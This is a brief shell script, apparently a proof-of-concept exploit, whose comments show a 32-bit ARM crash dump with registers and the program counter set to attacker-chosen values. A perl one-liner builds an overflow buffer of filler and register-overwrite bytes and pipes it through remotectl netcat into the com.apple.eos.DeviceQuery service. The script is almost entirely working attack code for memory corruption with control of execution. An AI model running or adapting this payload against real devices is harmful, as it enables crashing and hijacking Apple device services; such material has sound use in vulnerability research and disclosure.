#!/bin/sh
# Thread 1 crashed with ARM Thread State (32-bit):
# r0: 0xXXXXXXXX  r1: 0xXXXXXXXX  r2: 0xXXXXXXXX  r3: 0xXXXXXXXX
# r4: 0x04040404  r5: 0x05050505  r6: 0x06060606  r7: 0x07070707
# r8: 0x08080808  r9: 0x00048a2c r10: 0x0a0a0a0a r11: 0x0b0b0b0b
# ip: 0xXXXXXXXX  sp: 0xXXXXXXXX  lr: 0xXXXXXXXX  pc: 0x0f0f0f0e

perl -e '\
  print "\x00\x03"; print "\x00"x8; \
  print "\x00\x01"; print "stek"x130; \
  print "\x08"x4; print "\x0a"x4; \
  print "\x0b"x4; print "\x04"x4; \
  print "\x05"x4; print "\x06"x4; \
  print "\x07"x4; print "\x0f"x4; \
  print "_stack_fill_"x18' | \
  /usr/libexec/remotectl netcat localbridge com.apple.eos.DeviceQuery
